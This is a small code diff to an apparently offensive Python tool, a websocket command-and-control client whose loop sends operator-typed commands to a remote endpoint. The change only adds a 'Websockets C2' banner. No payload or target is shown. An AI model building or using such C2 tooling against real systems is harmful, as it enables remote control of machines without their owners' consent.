@@ -16,6 +16,7 @@ async def sendCMDs():
     cmd = ''
     while cmd != 'exit':
         async with websockets.connect(uri) as websocket:
+            prRed("[!] Websockets C2 [!]")
             cmd = input("Enter Command To Run: ")
             await websocket.send(cmd)
             prYellow(f"Sending {cmd}")
